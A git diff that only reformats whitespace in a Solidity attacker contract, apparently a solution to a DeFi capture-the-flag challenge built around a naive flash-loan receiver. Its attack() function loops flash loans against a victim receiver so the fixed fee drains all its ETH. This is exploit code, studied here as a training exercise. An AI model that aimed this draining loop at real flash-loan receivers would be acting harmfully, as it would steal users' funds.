@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity =0.8.19;
 
-import {IERC3156FlashBorrower} from  "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";
 
 contract FlashLoanReceiverAttacker {
@@ -15,16 +15,15 @@ contract FlashLoanReceiverAttacker {
     }
 
     function attack() external {
-
         // pool.flashLoan(receiver, ETH, 0, "");
 
         uint256 flashFee = 1 ether;
-        while( true ) {
+        while (true) {
             uint256 flashAmount = address(receiver).balance - flashFee;
             pool.flashLoan(receiver, ETH, flashAmount, "");
 
             // we have consumed all the ETH from the poor receiver :(
-            if( address(receiver).balance == 0 ) break;
+            if (address(receiver).balance == 0) break;
         }
     }
 }
